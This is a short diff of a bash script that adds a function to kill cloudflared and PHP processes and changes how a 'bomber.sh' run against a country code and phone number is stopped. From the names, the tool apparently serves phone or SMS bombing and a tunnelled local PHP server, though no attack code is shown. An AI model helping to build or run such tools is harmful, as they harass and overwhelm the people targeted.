@@ -75,6 +75,12 @@ for p in "${pkgs[@]}"; do
         cd $CWD >/dev/null 2>&1
     fi
 done
+#<<<=========killSession========>>>
+killSession() {
+    pidCloud=$(ps aux | grep "cloudflared" | awk '{print $2}')
+    pidPhp=$(ps aux | grep "php" | awk '{print $2}')
+    kill -9 $pidCloud $pidPhp >/dev/null 2>&1
+}
 #<<<=========Program=========>>>
 #collecting your name
 setPass() {
@@ -141,7 +147,7 @@ fi
 if [ -e $NUM ]; then
     rm -rf $NUM >/dev/null 2>&1
 fi
-killall php cloudflared >/dev/null 2>&1
+killSession
 cd $CWD/assets/ >/dev/null 2>&1
 php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt 2>&1 &
 sleep 4
@@ -168,9 +174,9 @@ bombControl() {
         cd $CWD/assets/bomb >/dev/null 2>&1
         bash $CWD/assets/bomb/bomber.sh "$CTRY" "$PHONE" &
     else
+        killSession
         PD=$(ps aux | grep bomber.sh | awk '{print $2}')
-        kill $PD >/dev/null 2>&1
-        killall curl >/dev/null 2>&1
+        kill -9 $PD >/dev/null 2>&1
     fi
 }
 while true; do
